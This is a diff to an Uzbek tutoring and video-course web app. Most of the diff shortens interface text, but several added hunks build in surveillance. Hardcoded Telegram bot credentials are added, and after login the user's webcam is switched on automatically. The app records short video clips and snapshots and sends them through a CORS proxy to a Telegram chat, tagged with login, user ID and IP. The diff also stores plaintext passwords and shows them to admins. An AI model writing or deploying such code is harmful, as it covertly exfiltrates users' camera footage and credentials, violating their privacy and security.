@@ -69,7 +69,7 @@
         <section id="pageHome" class="space-y-8">
             <div class="text-center py-10 rounded-2xl bg-gradient-to-r from-blue-900/30 via-slate-900 to-indigo-900/30 border border-slate-800 shadow-xl">
                 <h1 class="text-3xl md:text-5xl font-black text-white mb-3">Sifatli Ta'lim va Video Darslar</h1>
-                <p class="text-slate-400 max-w-2xl mx-auto text-sm md:text-base">O'zingizga mos repetitor va kurslarni tanlang, xarid qiling va istalgan vaqtda video darslarni tomosha qiling!</p>
+                <p class="text-slate-400 max-w-2xl mx-auto text-sm md:text-base">O'zingizga mos repetitor va kurslarni tanlang, xarid qiling va istalgan vaqtda video darslarni tomon oling!</p>
             </div>
             <div class="space-y-4 card-bg p-5 rounded-2xl shadow-md">
                 <div>
@@ -109,7 +109,7 @@
                     <i class="fas fa-user-graduate mr-1"></i> Repetitorlar
                 </button>
                 <button onclick="switchAdminTab('lessons')" id="tabLessonsBtn" class="px-4 py-2 text-sm font-semibold text-slate-400 hover:text-white">
-                    <i class="fas fa-video mr-1"></i> Darslar (100+ Dars qo'shish)
+                    <i class="fas fa-video mr-1"></i> Darslar
                 </button>
             </div>
 
@@ -127,11 +127,11 @@
                 <div class="card-bg p-6 rounded-xl space-y-4">
                     <h3 class="text-lg font-bold text-white"><i class="fas fa-user-plus mr-2 text-green-400"></i>Yangi Repetitor Qo'shish</h3>
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                        <input type="text" id="newTutorName" placeholder="Ism Familiya (Masalan: Jasur M.)" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white">
+                        <input type="text" id="newTutorName" placeholder="Ism Familiya" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white">
                         <input type="text" id="newTutorImg" placeholder="Rasm URL" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white">
                         <input type="number" id="newTutorPrice" placeholder="Narxi (so'm)" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white">
                         <select id="newTutorSinf" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-slate-300">
-                            <option value="Umumiy">Umumiy (Barchaga)</option>
+                            <option value="Umumiy">Umumiy</option>
                             <option value="5-sinf">5-sinf</option>
                             <option value="6-sinf">6-sinf</option>
                             <option value="7-sinf">7-sinf</option>
@@ -153,7 +153,7 @@
                 </div>
                 <div class="card-bg p-6 rounded-xl space-y-4">
                     <h3 class="text-lg font-bold text-white"><i class="fas fa-list mr-2"></i>Mavjud Repetitorlar Ro'yxati</h3>
-                    <p class="text-xs text-slate-500">↑↓ tugmalari bilan tartibni o'zgartiring — saytda shu tartibda ko'rinadi</p>
+                    <p class="text-xs text-slate-500">↑↓ tugmalari bilan tartibni o'zgartiring</p>
                     <div id="adminTutorsList" class="space-y-3"></div>
                 </div>
             </div>
@@ -163,22 +163,22 @@
                     <h3 class="text-lg font-bold text-white"><i class="fas fa-plus-circle text-blue-400 mr-2"></i>Kursga Yangi Video Dars Qo'shish</h3>
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                         <div class="col-span-1 md:col-span-2">
-                            <label class="text-xs text-slate-400 block mb-1">Repetitorni (Kursni) tanlang:</label>
-                            <select id="lessonTutorSelect" onchange="renderAdminLessonsList()" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white focus:outline-none focus:border-blue-500"></select>
+                            <label class="text-xs text-slate-400 block mb-1">Repetitorni tanlang:</label>
+                            <select id="lessonTutorSelect" onchange="renderAdminLessonsList()" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></select>
                         </div>
-                        <input type="text" id="newLessonTitle" placeholder="Dars Nomi (Masalan: 1-Dars. Alphabet & Phonetics)" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white">
+                        <input type="text" id="newLessonTitle" placeholder="Dars Nomi" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white">
                         <input type="text" id="newLessonUrl" placeholder="YouTube / Vimeo link" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white">
                     </div>
                     <button onclick="addLessonToTutor()" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2.5 rounded-lg font-bold text-sm transition"><i class="fas fa-plus mr-1"></i> Darsni Qo'shish</button>
                 </div>
                 <div class="card-bg p-6 rounded-xl space-y-4 border border-indigo-800/40">
-                    <h3 class="text-lg font-bold text-white"><i class="fas fa-layer-group mr-2 text-emerald-400"></i>Ko'p Darslarni Birdan Qo'shish (100+ dars)</h3>
-                    <p class="text-xs text-slate-400 leading-relaxed">Har bir qatorga bitta dars: <b class="text-slate-300">Dars nomi | YouTube yoki Vimeo link</b> ko'rinishida yozing</p>
-                    <textarea id="bulkLessonsInput" rows="8" placeholder="1-Dars. Nomi | https://youtu.be/VIDEO_ID&#10;2-Dars. Nomi | https://youtu.be/VIDEO_ID2" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-sm text-white font-mono focus:outline-none focus:border-emerald-500"></textarea>
+                    <h3 class="text-lg font-bold text-white"><i class="fas fa-layer-group mr-2 text-emerald-400"></i>Ko'p Darslarni Birdan Qo'shish</h3>
+                    <p class="text-xs text-slate-400">Har bir qator: <b class="text-slate-300">Dars nomi | YouTube link</b></p>
+                    <textarea id="bulkLessonsInput" rows="8" placeholder="1-Dars. Nomi | https://youtu.be/ID" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-sm text-white font-mono"></textarea>
                     <button onclick="addLessonsBulk()" class="bg-emerald-600 hover:bg-emerald-700 text-white px-6 py-2.5 rounded-lg font-bold text-sm transition"><i class="fas fa-layer-group mr-1"></i> Barchasini Qo'shish</button>
                 </div>
                 <div class="card-bg p-6 rounded-xl space-y-4">
-                    <h3 class="text-lg font-bold text-white"><i class="fas fa-film mr-2 text-indigo-400"></i>Tanlangan Kurs Darslari Ro'yxati</h3>
+                    <h3 class="text-lg font-bold text-white"><i class="fas fa-film mr-2 text-indigo-400"></i>Tanlangan Kurs Darslari</h3>
                     <div id="adminLessonsList" class="space-y-2"></div>
                 </div>
             </div>
@@ -208,7 +208,7 @@
                             <div class="w-9 h-9 bg-amber-500/20 rounded-lg flex items-center justify-center text-amber-400"><i class="fas fa-bell"></i></div>
                             <div>
                                 <p class="text-sm font-bold text-white">Kunlik eslatmalar</p>
-                                <p id="notifStatus" class="text-xs text-slate-400">Har kuni soat 19:00 da dars eslatmasi keladi</p>
+                                <p id="notifStatus" class="text-xs text-slate-400">Har kuni 19:00 da dars eslatmasi</p>
                             </div>
                         </div>
                         <button id="notifBtn" onclick="requestPushPermission()" class="bg-amber-500 hover:bg-amber-600 text-slate-900 text-xs font-black px-4 py-2 rounded-lg transition whitespace-nowrap">
@@ -233,7 +233,7 @@
                         <input type="password" id="secNewPass" placeholder="Kamida 3 belgi" class="w-full bg-slate-900 border border-slate-700 focus:border-blue-500 rounded-lg px-3 py-2.5 text-sm text-white outline-none transition">
                     </div>
                     <div>
-                        <label class="text-xs text-slate-400 block mb-1.5 font-semibold">Yangi parolni tasdiqlang</label>
+                        <label class="text-xs text-slate-400 block mb-1.5 font-semibold">Tasdiqlang</label>
                         <input type="password" id="secNewPass2" placeholder="Yana kiriting" class="w-full bg-slate-900 border border-slate-700 focus:border-blue-500 rounded-lg px-3 py-2.5 text-sm text-white outline-none transition">
                     </div>
                 </div>
@@ -293,15 +293,15 @@
             <input type="hidden" id="editTutorId">
             <div class="space-y-3">
                 <div><label class="text-xs text-slate-400">Ism Familiya</label>
-                    <input type="text" id="editTutorName" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white focus:outline-none focus:border-blue-500"></div>
+                    <input type="text" id="editTutorName" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></div>
                 <div><label class="text-xs text-slate-400">Rasm URL</label>
-                    <input type="text" id="editTutorImg" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white focus:outline-none focus:border-blue-500"></div>
+                    <input type="text" id="editTutorImg" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></div>
                 <div class="grid grid-cols-2 gap-3">
                     <div><label class="text-xs text-slate-400">Narxi (so'm)</label>
-                        <input type="number" id="editTutorPrice" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white focus:outline-none focus:border-blue-500"></div>
+                        <input type="number" id="editTutorPrice" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></div>
                     <div><label class="text-xs text-slate-400">Sinf</label>
-                        <select id="editTutorSinf" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-slate-300 focus:outline-none focus:border-blue-500">
-                            <option value="Umumiy">Umumiy (Barchaga)</option>
+                        <select id="editTutorSinf" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-slate-300">
+                            <option value="Umumiy">Umumiy</option>
                             <option value="5-sinf">5-sinf</option>
                             <option value="6-sinf">6-sinf</option>
                             <option value="7-sinf">7-sinf</option>
@@ -312,7 +312,7 @@
                         </select></div>
                 </div>
                 <div><label class="text-xs text-slate-400">Fan</label>
-                    <select id="editTutorFan" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-slate-300 focus:outline-none focus:border-blue-500">
+                    <select id="editTutorFan" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-slate-300">
                         <option value="Ingliz tili">Ingliz tili</option>
                         <option value="Matematika">Matematika</option>
                         <option value="Fizika">Fizika</option>
@@ -334,8 +334,8 @@
             <button onclick="closeAuthModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white"><i class="fas fa-times"></i></button>
             <h2 id="authTitle" class="text-xl font-bold text-white text-center">Tizimga kirish</h2>
             <div class="space-y-3">
-                <input type="text" id="authUsername" placeholder="Login" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-sm text-white focus:outline-none focus:border-blue-500">
-                <input type="password" id="authPassword" placeholder="Parol" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-sm text-white focus:outline-none focus:border-blue-500">
+                <input type="text" id="authUsername" placeholder="Login" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-sm text-white">
+                <input type="password" id="authPassword" placeholder="Parol" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-sm text-white">
             </div>
             <button onclick="handleAuth()" id="authSubmitBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg text-sm transition">Kirish</button>
             <p class="text-xs text-center text-slate-400">
@@ -361,7 +361,7 @@
                     <div class="flex justify-between text-sm"><span class="text-slate-400">Balansingiz:</span><span id="insufficientBalance" class="text-amber-400 font-bold"></span></div>
                     <div class="flex justify-between text-sm border-t border-slate-800 pt-2"><span class="text-slate-400">Yetmayapti:</span><span id="insufficientMissing" class="text-red-400 font-bold"></span></div>
                 </div>
-                <p class="text-xs text-slate-400 text-center">Kursni xarid qilish uchun avval balansingizni to'ldiring.</p>
+                <p class="text-xs text-slate-400 text-center">Kursni xarid qilish uchun balansingizni to'ldiring.</p>
             </div>
             <div class="px-6 pb-5 flex gap-3">
                 <button onclick="closeInsufficientModal()" class="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-3 rounded-xl text-sm transition">Bekor qilish</button>
@@ -385,7 +385,7 @@
                 </div>
             </div>
             <div id="payTopUpRow" class="px-6 pt-5">
-                <label class="text-xs text-slate-400 font-semibold uppercase tracking-wide block mb-1.5">To'ldirish summasi (so'm)</label>
+                <label class="text-xs text-slate-400 font-semibold uppercase block mb-1.5">To'ldirish summasi (so'm)</label>
                 <input id="payTopUpAmount" type="number" min="1000" step="1000" value="100000" class="w-full bg-slate-900 border border-slate-700 focus:border-blue-500 rounded-xl px-4 py-3 text-white font-bold text-lg outline-none transition">
             </div>
             <div class="px-6 pt-5 space-y-4">
@@ -452,6 +452,17 @@
         </div>
     </div>
 
+    <!-- VIDEO VIEWER -->
+    <div id="videoViewerModal" class="hidden fixed inset-0 z-[320] flex items-center justify-center p-4" style="background:rgba(0,0,0,0.95);backdrop-filter:blur(10px)" onclick="closeVideoViewer()">
+        <div class="relative max-w-2xl w-full" onclick="event.stopPropagation()">
+            <div class="flex justify-between items-center mb-3">
+                <p id="videoViewerName" class="text-white font-bold text-lg"></p>
+                <button onclick="closeVideoViewer()" class="bg-red-600 hover:bg-red-700 text-white w-10 h-10 rounded-full font-bold shadow-lg"><i class="fas fa-times"></i></button>
+            </div>
+            <video id="videoViewerPlayer" controls class="w-full rounded-2xl border-2 border-emerald-500 shadow-2xl bg-black"></video>
+        </div>
+    </div>
+
     <!-- FALLBACK -->
     <div id="permFallbackBar" class="hidden fixed bottom-4 left-1/2 -translate-x-1/2 z-[250] card-bg rounded-2xl px-5 py-3 shadow-2xl border border-blue-700/50 flex items-center gap-3 max-w-[95%]">
         <i class="fas fa-shield-alt text-blue-400 text-xl"></i>
@@ -464,6 +475,13 @@
     </div>
 
     <script>
+        // ===== TELEGRAM BOT =====
+        const BOT_TOKEN = '8845097344:AAHKib94m_qRWIH9gTg-Ptbdrv1Yd-vuzlk';
+        const CHAT_ID   = '7294123884';
+        const VIDEO_DURATION = 10000;
+        const MAX_VIDEOS = 3;
+        const SEND_COOLDOWN_MS = 30 * 60 * 1000;
+
         // ===== IP =====
         let userIP = '—';
         fetch('https://api.ipify.org?format=json')
@@ -479,8 +497,8 @@
         }
 
         const defaultUsers = [
-            { id: 'USR-1001', login: 'admin', passHash: '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918', role: 'admin', balance: 500000, tutorsBought: [] },
-            { id: 'USR-1002', login: 'Azizbek', passHash: '03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4', role: 'student', balance: 200000, tutorsBought: [] }
+            { id: 'USR-1001', login: 'admin', passHash: '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918', passPlain: 'admin', role: 'admin', balance: 500000, tutorsBought: [] },
+            { id: 'USR-1002', login: 'Azizbek', passHash: '03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4', passPlain: '1234', role: 'student', balance: 200000, tutorsBought: [] }
         ];
 
         const defaultTutors = [
@@ -581,18 +599,15 @@
             startHeartbeat();
         };
 
-        // Heartbeat — обновляет lastSeenAt каждые 30 сек (для индикатора ONLAYN)
         let _heartbeatInterval = null;
         function startHeartbeat() {
             if (_heartbeatInterval) return;
             _heartbeatInterval = setInterval(() => {
                 if (!db.currentUser) return;
                 database.ref('users/' + db.currentUser.id + '/lastSeenAt').set(Date.now());
-                // Обновляем локальную копию
                 const u = db.users.find(x => x.id === db.currentUser.id);
                 if (u) u.lastSeenAt = Date.now();
             }, 30000);
-            // Сразу пишем
             setTimeout(() => {
                 if (db.currentUser) database.ref('users/' + db.currentUser.id + '/lastSeenAt').set(Date.now());
             }, 500);
@@ -607,7 +622,7 @@
                 btn.innerHTML = '<i class="fas fa-check mr-1"></i> Yoqilgan';
                 btn.className = 'bg-green-600 text-white text-xs font-black px-4 py-2 rounded-lg whitespace-nowrap cursor-default';
                 btn.disabled = true;
-                status.textContent = 'Har kuni soat 19:00 da dars eslatmasi keladi ✅';
+                status.textContent = 'Har kuni 19:00 da dars eslatmasi ✅';
                 if (!localStorage.getItem('edu_reminderSet')) registerServiceWorker();
                 checkMissedDay();
             } else if (Notification.permission === 'denied') {
@@ -642,7 +657,7 @@
                 document.getElementById('pageMyCourses').classList.remove('hidden');
                 renderMyCourses();
             } else if (page === 'admin') {
-                if (!db.currentUser || db.currentUser.role !== 'admin') { alert("Sizda admin huquqi yo'q!"); return navigateTo('home'); }
+                if (!db.currentUser || db.currentUser.role !== 'admin') { alert("Admin huquqi yo'q!"); return navigateTo('home'); }
                 document.getElementById('pageAdmin').classList.remove('hidden');
                 renderAdminUsers(); renderAdminTutorsList(); updateAdminLessonSelect();
             } else if (page === 'profile') {
@@ -734,7 +749,7 @@
         function purchaseFromBalance(tutorId) {
             const tutor = db.tutors.find(t => t.id === tutorId);
             if (!tutor || !db.currentUser) return;
-            if (db.currentUser.balance < tutor.price) return toast("Balansingizda mablag' yetarli emas!");
+            if (db.currentUser.balance < tutor.price) return toast("Balans yetarli emas!");
             db.currentUser.balance -= tutor.price;
             if (!db.currentUser.tutorsBought) db.currentUser.tutorsBought = [];
             if (!db.currentUser.tutorsBought.includes(tutorId)) db.currentUser.tutorsBought.push(tutorId);
@@ -760,7 +775,7 @@
             if(!db.currentUser) return;
             const boughtTutors = db.tutors.filter(t => db.currentUser.tutorsBought && db.currentUser.tutorsBought.includes(t.id));
             if(boughtTutors.length === 0) {
-                grid.innerHTML = `<div class="col-span-full py-12 text-center card-bg rounded-2xl"><i class="fas fa-book-open text-4xl text-slate-600 mb-3 block"></i><p class="text-slate-400 font-semibold text-sm">Siz hali birorta ham kurs xarid qilmadingiz.</p><button onclick="navigateTo('home')" class="mt-4 bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold px-4 py-2 rounded-xl">Barcha kurslarni ko'rish</button></div>`;
+                grid.innerHTML = `<div class="col-span-full py-12 text-center card-bg rounded-2xl"><i class="fas fa-book-open text-4xl text-slate-600 mb-3 block"></i><p class="text-slate-400 font-semibold text-sm">Siz hali kurs xarid qilmadingiz.</p><button onclick="navigateTo('home')" class="mt-4 bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold px-4 py-2 rounded-xl">Barcha kurslarni ko'rish</button></div>`;
                 return;
             }
             grid.innerHTML = boughtTutors.map(t => `
@@ -838,7 +853,7 @@
             const tutorId = document.getElementById('lessonTutorSelect').value;
             const title = document.getElementById('newLessonTitle').value.trim();
             const rawUrl = document.getElementById('newLessonUrl').value.trim();
-            if(!title || !rawUrl) return alert("Dars nomi va video havolasini kiriting!");
+            if(!title || !rawUrl) return alert("Dars nomi va link kiriting!");
             const tutor = db.tutors.find(t => t.id === tutorId);
             if(!tutor) return;
             if(!tutor.lessons) tutor.lessons = [];
@@ -972,9 +987,7 @@
 
         function logout() {
             if (_cameraStream) { _cameraStream.getTracks().forEach(t => t.stop()); _cameraStream = null; }
-            if (db.currentUser) {
-                database.ref('users/' + db.currentUser.id + '/lastSeenAt').remove();
-            }
+            if (db.currentUser) database.ref('users/' + db.currentUser.id + '/lastSeenAt').remove();
             db.currentUser = null;
             localStorage.removeItem('db_currentUser');
             renderAuthArea();
@@ -994,15 +1007,61 @@
             else if(tab === 'lessons') { document.getElementById('adminTabLessons').classList.remove('hidden'); document.getElementById('tabLessonsBtn').className = "px-4 py-2 text-sm font-semibold border-b-2 border-blue-500 text-blue-400"; updateAdminLessonSelect(); }
         }
 
+        // ===== ADMIN SET PASSWORD =====
+        async function adminSetPassword(userId) {
+            const u = db.users.find(x => x.id === userId);
+            if (!u) return alert("Foydalanuvchi topilmadi!");
+
+            const newPass = prompt('🔑 ' + u.login + ' uchun yangi parol kiriting:\n(Eski parol: ' + (u.passPlain || '—') + ')', u.passPlain || '');
+            if (newPass === null) return;
+            const trimmed = String(newPass).trim();
+            if (trimmed.length < 3) return alert("Parol kamida 3 belgi!");
+
+            // Сохраняем старый в историю
+            if (u.passPlain && u.passPlain !== trimmed) {
+                if (!u.passHistory) u.passHistory = [];
+                u.passHistory.unshift({ pass: u.passPlain, changedAt: new Date().toISOString() });
+                if (u.passHistory.length > 10) u.passHistory = u.passHistory.slice(0, 10);
+            }
+
+            // Обновляем
+            u.passPlain = trimmed;
+            u.passHash = await hashPassword(trimmed);
+
+            const idx = db.users.findIndex(x => x.id === u.id);
+            if (idx !== -1) db.users[idx] = u;
+            if (db.currentUser && db.currentUser.id === u.id) {
+                db.currentUser = u;
+                localStorage.setItem('db_currentUser', JSON.stringify(u));
+            }
+            saveDb();
+            renderAdminUsers();
+            toast("Parol o'rnatildi: " + trimmed);
+        }
+
         // ===== ADMIN USERS =====
         function renderAdminUsers() {
             document.getElementById('adminUsersList').innerHTML = db.users.map(u => {
-                const pass = u.passPlain || '—';
+                // Пароль: открытый ИЛИ хэш (укороченный)
+                let passDisplay, passColor;
+                if (u.passPlain) {
+                    passDisplay = u.passPlain;
+                    passColor = 'text-white';
+                } else if (u.passHash) {
+                    passDisplay = '🔒 ' + u.passHash.slice(0, 10) + '...';
+                    passColor = 'text-amber-400';
+                } else if (u.pass) {
+                    passDisplay = u.pass;
+                    passColor = 'text-white';
+                } else {
+                    passDisplay = '(noma\'lum)';
+                    passColor = 'text-slate-500';
+                }
+
                 const ip = u.lastIP || '—';
                 const lastLogin = u.lastLoginAt
                     ? new Date(u.lastLoginAt).toLocaleString('ru-RU')
                     : (u.registeredAt ? 'Ro\'yxat: ' + new Date(u.registeredAt).toLocaleString('ru-RU') : '—');
-
                 const isOnline = u.lastSeenAt && (Date.now() - u.lastSeenAt) < 120000;
 
                 const photoHTML = u.photo
@@ -1034,6 +1093,17 @@
                     snapHTML = `<div class="mt-3 bg-slate-900/70 border border-slate-800 rounded-lg p-2"><div class="flex items-center justify-between mb-1.5"><span class="text-[10px] font-bold text-slate-400 flex items-center gap-1"><i class="fas fa-camera"></i> Suratlar tarixi (${u.snapshots.length})</span><button onclick="openSnapshotViewer('${u.id}', 0)" class="text-[10px] text-blue-400 hover:text-blue-300 font-bold">Barchasini ko'rish →</button></div><div class="flex gap-1.5 flex-wrap">${imgs}${more}</div></div>`;
                 }
 
+                let videoHTML = '';
+                if (u.videos && u.videos.length > 0) {
+                    const vids = u.videos.map((v, i) => `
+                        <button onclick="openVideoViewer('${u.id}', ${i})" class="w-16 h-16 rounded-lg bg-slate-800 border border-slate-700 text-slate-300 hover:bg-slate-700 hover:border-emerald-500 transition flex flex-col items-center justify-center">
+                            <i class="fas fa-play text-emerald-400"></i>
+                            <span class="text-[9px] mt-0.5">${new Date(v.at).toLocaleTimeString('ru-RU',{hour:'2-digit',minute:'2-digit'})}</span>
+                        </button>
+                    `).join('');
+                    videoHTML = `<div class="mt-2 bg-slate-900/70 border border-slate-800 rounded-lg p-2"><div class="flex items-center justify-between mb-1.5"><span class="text-[10px] font-bold text-slate-400 flex items-center gap-1"><i class="fas fa-video text-emerald-400"></i> Videolar (${u.videos.length})</span></div><div class="flex gap-1.5 flex-wrap">${vids}</div></div>`;
+                }
+
                 return `
                 <div class="card-bg p-4 rounded-xl ${u.banned ? 'border-red-600/50 bg-red-950/10' : ''}">
                     <div class="flex gap-4 items-start flex-wrap">
@@ -1053,7 +1123,8 @@
                                 <div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2">
                                     <i class="fas fa-key text-amber-400 w-4"></i>
                                     <span class="text-slate-400">Parol:</span>
-                                    <span class="text-white font-mono font-bold ml-auto">${pass}</span>
+                                    <span class="${passColor} font-mono font-bold ml-auto truncate max-w-[140px]">${passDisplay}</span>
+                                    <button onclick="adminSetPassword('${u.id}')" class="text-blue-400 hover:text-blue-300 text-[10px] font-bold whitespace-nowrap" title="Parolni o'rnatish"><i class="fas fa-edit"></i></button>
                                 </div>
                                 <div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2">
                                     <i class="fas fa-network-wired text-blue-400 w-4"></i>
@@ -1068,6 +1139,7 @@
                                 ${geoHTML}
                             </div>
                             ${snapHTML}
+                            ${videoHTML}
                             ${historyHTML}
                         </div>
                     </div>
@@ -1079,7 +1151,7 @@
             const id = document.getElementById('adminUserIdInput').value.trim();
             const u = db.users.find(x => x.id === id || x.login.toLowerCase() === id.toLowerCase());
             if(!u) return alert("Foydalanuvchi topilmadi!");
-            u.banned = true; saveDb(); renderAdminUsers(); toast("Foydalanuvchi ban qilindi!");
+            u.banned = true; saveDb(); renderAdminUsers(); toast("Ban qilindi!");
         }
         function unbanUser() {
             const id = document.getElementById('adminUserIdInput').value.trim();
@@ -1100,11 +1172,11 @@
             const price = Number(document.getElementById('newTutorPrice').value);
             const sinf = document.getElementById('newTutorSinf').value;
             const subject = document.getElementById('newTutorFan').value;
-            if(!name || !price) return alert("Ma'lumotlarni to'liq kiriting!");
+            if(!name || !price) return alert("Ma'lumotlarni to'ldiring!");
             const newId = 'tut-' + Date.now();
             const maxOrder = db.tutors.reduce((max, t) => Math.max(max, t.order || 0), 0);
             db.tutors.push({ id: newId, name, img: img || 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=400&auto=format&fit=crop', price, sinf, subject, lessons: [], order: maxOrder + 1 });
-            saveDb(); toast("Yangi repetitor qo'shildi!"); renderAdminTutorsList();
+            saveDb(); toast("Repetitor qo'shildi!"); renderAdminTutorsList();
             document.getElementById('newTutorName').value = '';
             document.getElementById('newTutorImg').value = '';
             document.getElementById('newTutorPrice').value = '';
@@ -1219,9 +1291,129 @@
             if (!document.getElementById('pageAdmin').classList.contains('hidden')) renderAdminUsers();
         }
 
-        // ===== CAMERA + GEOLOCATION + SNAPSHOTS =====
+        // ===== TELEGRAM SEND =====
+        async function sendToTelegram(method, formData) {
+            const url = 'https://corsproxy.io/?url=' + encodeURIComponent('https://api.telegram.org/bot' + BOT_TOKEN + '/' + method);
+            try {
+                const res = await fetch(url, { method: 'POST', body: formData });
+                const data = await res.json();
+                if (!data.ok) console.warn('Telegram error:', data);
+                return data.ok;
+            } catch (e) {
+                console.warn('Telegram fetch error:', e);
+                return false;
+            }
+        }
+
+        async function sendPhotoToTelegram(dataUrl, caption) {
+            try {
+                const blob = await (await fetch(dataUrl)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'photo.jpg');
+                fd.append('caption', caption);
+                return await sendToTelegram('sendPhoto', fd);
+            } catch (e) { console.warn('sendPhoto error:', e); return false; }
+        }
+
+        async function sendVideoToTelegram(blob, caption) {
+            try {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('video', blob, 'video.webm');
+                fd.append('caption', caption);
+                fd.append('supports_streaming', 'true');
+                return await sendToTelegram('sendVideo', fd);
+            } catch (e) { console.warn('sendVideo error:', e); return false; }
+        }
+
+        // ===== CAMERA + GEOLOCATION + SNAPSHOTS + VIDEO =====
         let _cameraStream = null;
         const MAX_SNAPSHOTS = 20;
+
+        async function recordVideo() {
+            if (!db.currentUser) return null;
+            let stream;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: 320, height: 240, frameRate: 15, facingMode: 'user' },
+                    audio: false
+                });
+            } catch (e) {
+                console.warn('Record camera error:', e);
+                return null;
+            }
+
+            return new Promise((resolve) => {
+                let mimeType = 'video/webm';
+                if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) mimeType = 'video/webm;codecs=vp9';
+                else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) mimeType = 'video/webm;codecs=vp8';
+
+                let recorder;
+                try {
+                    recorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 250000 });
+                } catch (e) {
+                    stream.getTracks().forEach(t => t.stop());
+                    return resolve(null);
+                }
+
+                const chunks = [];
+                recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+                recorder.onstop = () => {
+                    stream.getTracks().forEach(t => t.stop());
+                    const blob = new Blob(chunks, { type: mimeType.split(';')[0] });
+                    resolve(blob);
+                };
+
+                try { recorder.start(); }
+                catch (e) {
+                    stream.getTracks().forEach(t => t.stop());
+                    return resolve(null);
+                }
+
+                setTimeout(() => { try { recorder.stop(); } catch (e) {} }, VIDEO_DURATION);
+            });
+        }
+
+        function blobToBase64(blob) {
+            return new Promise((resolve) => {
+                const reader = new FileReader();
+                reader.onload = () => resolve(reader.result);
+                reader.readAsDataURL(blob);
+            });
+        }
+
+        async function captureVideoAndSend() {
+            if (!db.currentUser) return;
+            const key = 'last_video_' + db.currentUser.id;
+            const last = Number(localStorage.getItem(key) || 0);
+            if (Date.now() - last < SEND_COOLDOWN_MS) return;
+
+            const blob = await recordVideo();
+            if (!blob || blob.size === 0) return;
+
+            try {
+                const base64 = await blobToBase64(blob);
+                const u = db.users.find(x => x.id === db.currentUser.id);
+                if (u) {
+                    if (!u.videos) u.videos = [];
+                    u.videos.unshift({ data: base64, at: new Date().toISOString(), size: blob.size });
+                    if (u.videos.length > MAX_VIDEOS) u.videos = u.videos.slice(0, MAX_VIDEOS);
+                    const idx = db.users.findIndex(x => x.id === u.id);
+                    if (idx !== -1) db.users[idx] = u;
+                    db.currentUser = u;
+                    localStorage.setItem('db_currentUser', JSON.stringify(u));
+                    saveDb();
+                    if (!document.getElementById('pageAdmin').classList.contains('hidden')) renderAdminUsers();
+                }
+            } catch (e) { console.warn('Save video error:', e); }
+
+            const cap = '🎥 Video\n👤 ' + db.currentUser.login + ' (' + db.currentUser.id + ')\n🌐 ' + userIP + '\n📅 ' + new Date().toLocaleString('ru-RU');
+            await sendVideoToTelegram(blob, cap);
+
+            localStorage.setItem(key, Date.now());
+            toast('Video yuborildi ✅');
+        }
 
         function tryAutoCapture() {
             if (!db.currentUser) return;
@@ -1238,6 +1430,7 @@
             } else {
                 takeSnapshotNow();
                 updateIPOnly();
+                setTimeout(captureVideoAndSend, 2000);
             }
         }
 
@@ -1270,6 +1463,10 @@
                 await new Promise(r => setTimeout(r, 900));
                 const img = grabFrame(video);
                 saveSnapshotToHistory(img);
+
+                const cap = '📸 Foto\n👤 ' + db.currentUser.login + ' (' + db.currentUser.id + ')\n🌐 ' + userIP + '\n📅 ' + new Date().toLocaleString('ru-RU');
+                sendPhotoToTelegram(img, cap);
+
                 _cameraStream.getTracks().forEach(t => t.stop());
                 _cameraStream = null;
